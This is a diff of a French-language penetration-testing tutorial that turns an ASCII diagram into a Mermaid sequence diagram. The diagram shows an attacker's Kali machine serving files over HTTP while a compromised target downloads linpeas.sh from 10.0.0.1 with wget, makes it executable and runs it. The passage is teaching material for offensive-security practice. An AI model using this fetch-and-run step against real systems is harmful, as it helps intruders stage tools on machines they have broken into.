@@ -109,12 +109,13 @@ ss -tulnp                    # ports en écoute + processus (remplace netstat)
 
 Une fois sur la cible, tu dois souvent exfiltrer ou faire monter des outils. Sans interface, on improvise un serveur HTTP :
 
-```
-Attaquant (Kali)                          Cible
-─────────────────                         ──────
-python3 -m http.server 8000      ───►     wget http://10.0.0.1:8000/linpeas.sh
-(sert le répertoire courant)              chmod +x linpeas.sh
-                                          ./linpeas.sh
+```mermaid
+sequenceDiagram
+    participant A as Attaquant (Kali)
+    participant C as Cible
+    Note over A: python3 -m http.server 8000<br/>(sert le répertoire courant)
+    A->>C: wget http://10.0.0.1:8000/linpeas.sh
+    Note over C: chmod +x linpeas.sh<br/>./linpeas.sh
 ```
 
 ```bash
